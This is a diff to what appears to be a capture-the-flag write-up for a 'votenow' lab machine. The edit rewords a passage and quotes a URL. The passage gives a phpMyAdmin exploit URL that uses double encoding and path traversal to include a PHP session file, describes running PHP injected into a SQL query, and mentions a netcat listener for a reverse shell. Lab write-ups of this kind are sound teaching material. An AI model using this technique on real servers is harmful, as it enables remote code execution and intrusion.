@@ -68,9 +68,10 @@ The phpMyAdmin cookie can be obtained by using the browser inspector and seeing 
 
 After authentication it is possible to execute sql queries on the databases present.
 
-The normal functioning of the web application does not allow the interpretation and execution of code inserted in the backticks. However, by carefully structuring the URL and inserting a php script between backticks into a SQL query, it is possible to obtain the execution of the script.
+Under normal circumstances, the web application does not interpret or execute code placed within backticks. However, by meticulously crafting the URL and embedding a PHP script within backticks in a SQL query, it becomes possible to execute the script.
+
 The URL must have the following format:
-http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/ php/session/sess_{cookieValue}
+'http://datasafe.votenow.local/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/ php/session/sess_{cookieValue}'
 where {cookieValue} is the current session's cookie value.
 
 By listening with a netcat listener on port 443 and injecting a SQL query like:
